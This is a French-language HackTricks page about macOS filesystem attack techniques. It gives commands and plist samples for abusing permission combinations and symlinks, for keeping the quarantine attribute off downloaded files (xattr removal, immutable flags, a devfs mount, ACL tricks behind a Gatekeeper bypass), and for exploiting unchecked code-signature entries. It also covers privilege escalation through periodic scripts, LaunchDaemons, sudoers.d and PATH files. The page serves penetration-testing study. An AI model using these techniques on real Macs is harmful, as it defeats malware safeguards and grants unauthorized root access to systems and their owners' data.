# Astuces macOS FS

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en équipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.

</details>

## Combinaisons de permissions POSIX

Permissions dans un **répertoire** :

* **lecture** - vous pouvez **énumérer** les entrées du répertoire
* **écriture** - vous pouvez **supprimer/écrire** des **fichiers** dans le répertoire et vous pouvez **supprimer des dossiers vides**.&#x20;
* Mais vous **ne pouvez pas supprimer/modifier des dossiers non vides** à moins d'avoir des permissions d'écriture dessus.
* Vous **ne pouvez pas modifier le nom d'un dossier** à moins d'en être le propriétaire.
* **exécution** - vous êtes **autorisé à traverser** le répertoire - si vous n'avez pas ce droit, vous ne pouvez pas accéder à des fichiers à l'intérieur, ni à des sous-répertoires.

### Combinaisons dangereuses

**Comment écraser un fichier/dossier détenu par root**, mais :

* Un **propriétaire de répertoire parent** dans le chemin est l'utilisateur
* Un **propriétaire de répertoire parent** dans le chemin est un **groupe d'utilisateurs** avec **accès en écriture**
* Un **groupe d'utilisateurs** a **accès en écriture** au **fichier**

Avec l'une des combinaisons précédentes, un attaquant pourrait **injecter** un **lien symbole/dur** dans le chemin attendu pour obtenir une écriture arbitraire privilégiée.

### Cas spécial de la racine du dossier R+X

S'il y a des fichiers dans un **répertoire** où **seul root a un accès en R+X**, ceux-ci ne sont **pas accessibles à d'autres personnes**. Ainsi, une vulnérabilité permettant de **déplacer un fichier lisible par un utilisateur**, qui ne peut pas être lu en raison de cette **restriction**, de ce dossier **vers un autre**, pourrait être exploitée pour lire ces fichiers.

Exemple dans : [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Lien symbolique / Lien physique

Si un processus privilégié écrit des données dans un **fichier** qui pourrait être **contrôlé** par un **utilisateur moins privilégié**, ou qui pourrait avoir été **précédemment créé** par un utilisateur moins privilégié. L'utilisateur pourrait simplement **le pointer vers un autre fichier** via un lien symbolique ou physique, et le processus privilégié écrira sur ce fichier.

Consultez les autres sections où un attaquant pourrait **abuser d'une écriture arbitraire pour escalader les privilèges**.

## .fileloc

Les fichiers avec l'extension **`.fileloc`** peuvent pointer vers d'autres applications ou binaires, de sorte que lorsque ils sont ouverts, l'application/le binaire sera celui/celle qui sera exécuté.\
Exemple :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## FD arbitraire

Si vous pouvez **faire en sorte qu'un processus ouvre un fichier ou un dossier avec des privilèges élevés**, vous pouvez abuser de **`crontab`** pour ouvrir un fichier dans `/etc/sudoers.d` avec **`EDITOR=exploit.py`**, ainsi `exploit.py` obtiendra le FD du fichier à l'intérieur de `/etc/sudoers` et l'exploitera.

Par exemple : [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Astuces pour éviter les xattrs de quarantaine

### Supprimez-le
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### Drapeau uchg / uchange / uimmutable

Si un fichier/dossier a cet attribut immuable, il ne sera pas possible d'y ajouter un xattr
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Montage defvfs

Un **montage devfs** **ne prend pas en charge les xattr**, plus d'informations dans [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### ACL writeextattr

Cet ACL empêche l'ajout de `xattrs` au fichier
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Le format de fichier **AppleDouble** copie un fichier y compris ses ACEs.

Dans le [**code source**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), il est possible de voir que la représentation textuelle de l'ACL stockée à l'intérieur du xattr appelé **`com.apple.acl.text`** va être définie comme ACL dans le fichier décompressé. Ainsi, si vous avez compressé une application dans un fichier zip avec le format de fichier **AppleDouble** avec un ACL qui empêche l'écriture d'autres xattrs... le xattr de quarantaine n'a pas été défini dans l'application :

Consultez le [**rapport original**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) pour plus d'informations.

Pour reproduire cela, nous devons d'abord obtenir la chaîne d'ACL correcte :
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Notez que même si cela fonctionne, le bac à sable écrit l'attribut de quarantaine avant)

Pas vraiment nécessaire mais je le laisse là au cas où:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Contourner les signatures de code

Les bundles contiennent le fichier **`_CodeSignature/CodeResources`** qui contient le **hash** de chaque **fichier** dans le **bundle**. Notez que le hash de CodeResources est également **incorporé dans l'exécutable**, donc nous ne pouvons pas y toucher non plus.

Cependant, il y a certains fichiers dont la signature ne sera pas vérifiée, ceux-ci ont la clé omit dans le plist, comme suit:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Il est possible de calculer la signature d'une ressource à partir de l'interface de ligne de commande avec :

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Monter des fichiers DMG

Un utilisateur peut monter un fichier DMG personnalisé même sur certains dossiers existants. Voici comment vous pourriez créer un package DMG personnalisé avec un contenu personnalisé:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## Écritures arbitraires

### Scripts sh périodiques

Si votre script peut être interprété comme un **script shell**, vous pouvez écraser le script shell **`/etc/periodic/daily/999.local`** qui sera déclenché chaque jour.

Vous pouvez **simuler** l'exécution de ce script avec : **`sudo periodic daily`**

### Daemons

Écrivez un **LaunchDaemon** arbitraire comme **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** avec un plist exécutant un script arbitraire comme :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### Fichier Sudoers

Si vous avez **des droits d'écriture arbitraires**, vous pourriez créer un fichier à l'intérieur du dossier **`/etc/sudoers.d/`** vous accordant des privilèges **sudo**.

### Fichiers PATH

Le fichier **`/etc/paths`** est l'un des principaux endroits qui alimentent la variable d'environnement PATH. Vous devez être root pour le remplacer, mais si un script d'un **processus privilégié** exécute une **commande sans le chemin complet**, vous pourriez le **détourner** en modifiant ce fichier.

&#x20;Vous pouvez également écrire des fichiers dans **`/etc/paths.d`** pour charger de nouveaux dossiers dans la variable d'environnement `PATH`.

## Références

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Apprenez le piratage AWS de zéro à héros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres façons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
